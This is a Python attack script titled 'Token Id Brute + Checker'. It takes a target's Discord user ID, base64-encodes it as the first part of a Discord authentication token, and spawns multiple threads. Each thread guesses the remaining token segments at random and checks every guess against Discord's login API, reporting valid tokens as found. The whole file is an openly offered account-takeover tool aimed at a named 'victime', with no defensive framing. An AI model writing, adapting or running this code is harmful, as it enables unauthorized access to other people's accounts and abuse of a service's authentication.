from Options.Options import *

import base64
import threading
import random
import string
import requests
import colorama
from colorama import Fore
colorama.init()

Title("Token Id Brute + Checker")

idtoken = base64.b64encode((input(f"{color.RED}[?] | Victime ID -> {color.RESET}")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
try:
 thrd =  input(f"{color.RED}\n[?] | Threads -> {color.RESET}")
except:
 ErrorNumber()

def bruhmoment():
    while idtoken == idtoken:
        try:
         token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        except:
         ErrorId()
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(f"{color.GREEN}[X] | {color.CYAN}{token}{color.GREEN} | Token Found{color.RESET}")

        else:
                print(f"{color.RED}[X] | {color.CYAN}{token}{color.RED} | Token Invalid{color.RESET}")

threads = []
try:
 for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)
except:
 ErrorNumber()

for thread in threads:
    thread.join()